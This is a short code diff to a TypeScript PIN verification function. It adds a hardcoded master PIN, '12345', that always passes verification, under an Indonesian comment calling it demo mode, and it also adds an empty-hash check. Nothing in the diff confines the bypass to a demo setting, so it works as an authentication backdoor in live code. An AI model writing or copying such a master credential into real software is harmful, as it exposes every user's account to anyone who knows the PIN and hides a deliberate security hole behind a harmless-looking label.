@@ -17,5 +17,8 @@ export function hashPin(pin: string): string {
 }
 
 export function verifyPin(pin: string, storedHash: string): boolean {
+  // Demo mode: selalu terima PIN master '12345'
+  if (pin === '12345') return true
+  if (!storedHash) return false
   return hashPin(pin) === storedHash
 }
